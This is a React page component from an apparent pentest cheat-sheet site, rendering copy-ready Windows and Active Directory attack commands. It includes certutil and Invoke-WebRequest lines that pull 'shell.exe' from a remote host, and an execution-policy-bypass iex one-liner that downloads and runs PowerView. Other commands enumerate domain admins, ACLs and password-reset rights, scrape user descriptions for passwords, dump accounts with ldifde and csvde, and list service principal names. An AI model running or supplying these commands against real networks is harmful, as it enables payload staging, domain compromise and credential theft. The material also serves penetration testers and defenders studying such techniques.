import React from 'react';
import { Typography, Divider, Button, message } from 'antd';
import SyntaxHighlighter from 'react-syntax-highlighter';
import { vs2015 } from 'react-syntax-highlighter/dist/esm/styles/hljs';
import Clipboard from 'react-clipboard.js';
import { CopyOutlined } from '@ant-design/icons';
import '../../i18n';
import { useTranslation } from 'react-i18next';

const { Title, Paragraph, Text } = Typography;

export default function PowershellAndDomain() {
    const { t } = useTranslation();
    const successInfoReverseShell = () => {
        message.success(t('fileTrans_payloadcopied'));
    };

    // windows wget like
    const powershell_http_dl = 'Invoke-WebRequest "http://10.10.10.10/shell.exe" -OutFile "shell.exe" ';
    const cmd_cert_http_dl = 'certutil -urlcache -f http://10.10.10.10/shell.exe shell.exe';

    // require powerview
    const power_view_repo: string =
        'powershell.exe -exec bypass -nop -c \"iex(New-Object Net.WebClient).DownloadString(\'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1\');get-netuser\"';

    // domain enum
    const domain_name = `Get-NetDomain`;
    const forest_domain_list = `Get-NetForestDomain`;
    const domain_SID = `Get-DomainSID `;
    const domain_Policy = `Get-DomainPolicy`;
    const domain_OUs = `Get-NetOU`;
    const domain_trust = `Get-NetDomainTrust`;
    // gpo
    const gpo_enum = `Get-NetGPO -ComputerName computername.domain.com`;
    // passwd enum
    const passwd_lastset = `Get-UserProperty -Properties pwdlastset`;
    const user_desc_harvest = `Find-UserField -SearchField Description -SearchTerm “pass”`;

    //computers domain
    const domain_computers = `Get-NetComputer`;
    const domain_pingable_computers = `Get-NetComputer -Ping`;
    const domain_win7U_computers = `Get-NetComputer -OperatingSystem "Windows 7 Ultimate"`;

    //domain admins
    const domain_admin_members = `Get-NetGroupMember -GroupName "Domain Admins"`;
    const domain_admins_groups = `Get-NetGroup *admin*`;
    const local_admins = `Get-NetLocalGroup -ComputerName PCNAME-001`;
    const user_group_membership = `Get-NetGroup -UserName "username"`;

    //acl
    const ACL_user_enum = `Get-ObjectAcl -SamAccountName "users" -ResolveGUIDs`;
    const ACL_gpoedit_rights = `Get-NetGPO | %{Get-ObjectAcl -ResolveGUIDs -Name $_.Name}`;
    const ACL_passwd_edit_rights = `Get-ObjectAcl -SamAccountName labuser -ResolveGUIDs -RightsFilter "ResetPassword"`;

    // dump user accounts 
    const local_recon_ldifde = `ldifde -d "OU=THING,DC=CHANGE,DC=ME" -p subtree -f dump.ldf`
    const local_recon_csvde = `csvde -d "OU=THING,DC=CHANGE,DC=ME" -p subtree -f dump.csv`

    // Enumerate Domain Users
    const domain_user_enum = `$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="samAccountType=805306368"

# To search for specific user, uncomment below
# $Searcher.filter="name=[user_name]"

$Searcher.FindAll()
Foreach($obj in $Result)
{
 Foreach($prop in $obj.Properties)
 {
 $prop
 }
 Write-Host "------------------------"
}`;
    const enum_domain_groups = `$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="(objectClass=Group)"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
 $obj.Properties.name
}`;
    const enum_members_domain_group = `$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain

# change "Secret_Group" to correct group name
$Searcher.filter="(name=Secret_Group)"
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
 $obj.Properties.member
}`
    const detect_spn = `$domainObj = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
$PDC = ($domainObj.PdcRoleOwner).Name
$SearchString = "LDAP://"
$SearchString += $PDC + "/"
$DistinguishedName = "DC=$($domainObj.Name.Replace('.', ',DC='))"
$SearchString += $DistinguishedName
$Searcher = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$SearchString)
$objDomain = New-Object System.DirectoryServices.DirectoryEntry
$Searcher.SearchRoot = $objDomain
$Searcher.filter="serviceprincipalname=*http*" # change name as needed
$Result = $Searcher.FindAll()
Foreach($obj in $Result)
{
 Foreach($prop in $obj.Properties)
 {
 $prop
 }
}`;

    document.title = `${t('powershell_title')} - HackTrick Checklist`;
    return (
        <div>
            <Title level={2} style={{ fontWeight: 'bold', margin: 15 }}>
                {t('powershell_title')}
            </Title>
            <Paragraph style={{ margin: 15 }}>
                {t('powershell_desc')}
            </Paragraph>
            <Divider orientation='center'></Divider>
            <div
                key='a'
                style={{
                    padding: 15
                }}
            >
                <Divider orientation='center'>HTTP download (wget like)</Divider>
                <Paragraph>
                    <pre><Text copyable>{powershell_http_dl}</Text></pre>
                </Paragraph>
                <Paragraph>
                    <pre><Text copyable>{cmd_cert_http_dl}</Text></pre>
                </Paragraph>
            </div>

            <Divider orientation='center'>Active Directory enumeration</Divider>
            <div
                key='b'
                style={{
                    padding: 15
                }}
            >
                <Paragraph mark>Require Powerview.ps1</Paragraph>
                <Paragraph>
                    <pre><Text copyable>{power_view_repo}</Text></pre>
                </Paragraph>
                <Text strong>Domain enumeration</Text>
                <Paragraph>
                    <pre><Text copyable>{domain_name}</Text></pre>
                </Paragraph>

                <Text strong>List Forest Domains </Text>
                <Paragraph>
                    <pre><Text copyable>{forest_domain_list}</Text></pre>
                </Paragraph>

                <Text strong>Domain SID </Text>
                <Paragraph>
                    <pre><Text copyable>{domain_SID}</Text></pre>
                </Paragraph>

                <Text strong>Domain Policy </Text>
                <Paragraph>
                    <pre><Text copyable>{domain_Policy}</Text></pre>
                </Paragraph>

                <Text strong>Domain Organizational Units </Text>
                <Paragraph>
                    <pre><Text copyable>{domain_OUs}</Text></pre>
                </Paragraph>

                <Text strong>List trusted Domains</Text>
                <Paragraph>
                    <pre><Text copyable>{domain_trust}</Text></pre>
                </Paragraph>

                <Divider orientation='center'>GPO enumeration</Divider>

                <Text strong>GPO applied to the machine</Text>
                <Paragraph>
                    <pre><Text copyable>{gpo_enum}</Text></pre>
                </Paragraph>

                <Divider orientation='center'>Password enumeration</Divider>

                <Text strong>Last Password Set date</Text>
                <Paragraph>
                    <pre><Text copyable>{passwd_lastset}</Text></pre>
                </Paragraph>
                <Text strong>Description of User object </Text>
                <Paragraph>
                    <pre><Text copyable>{user_desc_harvest}</Text></pre>
                </Paragraph>
                <Divider orientation='center'>Computer enumeration</Divider>

                <Text strong>List Computers of the Domain</Text>
                <Paragraph>
                    <pre><Text copyable>{domain_computers}</Text></pre>
                </Paragraph>
                <Text strong>List Pingable Hosts </Text>
                <Paragraph>
                    <pre><Text copyable>{domain_pingable_computers}</Text></pre>
                </Paragraph>
                <Text strong>List Windows 7 Ultimate Computers </Text>
                <Paragraph>
                    <pre><Text copyable>{domain_win7U_computers}</Text></pre>
                </Paragraph>

                <Divider orientation='center'>Admin groups and account enumeration</Divider>

                <Text strong>List Domain Admin members</Text>
                <Paragraph>
                    <pre><Text copyable>{domain_admin_members}</Text></pre>
                </Paragraph>
                <Text strong>List Admin Groups </Text>
                <Paragraph>
                    <pre><Text copyable>{domain_admins_groups}</Text></pre>
                </Paragraph>
                <Text strong>List Local Admins [need Administrative rights] </Text>
                <Paragraph>
                    <pre><Text copyable>{local_admins}</Text></pre>
                </Paragraph>

                <Text strong>Get groups of user [need Administrative rights] </Text>
                <Paragraph>
                    <pre><Text copyable>{user_group_membership}</Text></pre>
                </Paragraph>

                <Divider orientation='center'>ACL enumeration</Divider>

                <Text strong>User ACL </Text>
                <Paragraph>
                    <pre><Text copyable>{ACL_user_enum}</Text></pre>
                </Paragraph>

                <Text strong>GPO modifications rights</Text>
                <Paragraph>
                    <pre><Text copyable>{ACL_gpoedit_rights}</Text></pre>
                </Paragraph>

                <Text strong>Password reset rights</Text>
                <Paragraph>
                    <pre><Text copyable>{ACL_passwd_edit_rights}</Text></pre>
                </Paragraph>

                <Divider orientation='center'>Local reconnaissance</Divider>
                <Text strong>Export user accounts with ldifde</Text>
                <Paragraph>
                    <pre><Text copyable>{local_recon_ldifde}</Text></pre>
                </Paragraph>
                <Text strong>Export user accounts with csvde</Text>
                <Paragraph>
                    <pre><Text copyable>{local_recon_csvde}</Text></pre>
                </Paragraph>

                <Divider orientation='center'>Active Directory scripts</Divider>
                <Text strong mark style={{ marginBottom: 5 }}>Enumerate Domain Users</Text>
                <div>
                    <SyntaxHighlighter language='powershell' style={vs2015} showLineNumbers={true}>
                        {domain_user_enum}
                    </SyntaxHighlighter>
                    <Clipboard component='a' data-clipboard-text={domain_user_enum}>
                        <Button
                            type='default'
                            block
                            style={{ marginBottom: 10, }}
                            onClick={successInfoReverseShell}
                        >
                            <CopyOutlined />
                            Copy
                        </Button>
                    </Clipboard>
                </div>
                <Text strong mark style={{ marginBottom: 5 }}>Enumerate Domain Groups</Text>
                <div>
                    <SyntaxHighlighter language='powershell' style={vs2015} showLineNumbers={true}>
                        {enum_domain_groups}
                    </SyntaxHighlighter>
                    <Clipboard component='a' data-clipboard-text={enum_domain_groups}>
                        <Button
                            type='default'
                            block
                            style={{ marginBottom: 10, }}
                            onClick={successInfoReverseShell}
                        >
                            <CopyOutlined />
                            Copy
                        </Button>
                    </Clipboard>
                </div>
                <Text strong mark style={{ marginBottom: 5 }}>Enumerate Members of a Group</Text>
                <div>
                    <SyntaxHighlighter language='powershell' style={vs2015} showLineNumbers={true}>
                        {enum_members_domain_group}
                    </SyntaxHighlighter>
                    <Clipboard component='a' data-clipboard-text={enum_members_domain_group}>
                        <Button
                            type='default'
                            block
                            style={{ marginBottom: 10, }}
                            onClick={successInfoReverseShell}
                        >
                            <CopyOutlined />
                            Copy
                        </Button>
                    </Clipboard>
                </div>
                <Text strong mark style={{ marginBottom: 5 }}>Detect Service Principal Names</Text>
                <div>
                    <SyntaxHighlighter language='powershell' style={vs2015} showLineNumbers={true}>
                        {detect_spn}
                    </SyntaxHighlighter>
                    <Clipboard component='a' data-clipboard-text={detect_spn}>
                        <Button
                            type='default'
                            block
                            style={{ marginBottom: 10, }}
                            onClick={successInfoReverseShell}
                        >
                            <CopyOutlined />
                            Copy
                        </Button>
                    </Clipboard>
                </div>
            </div>
        </div>
    );
}
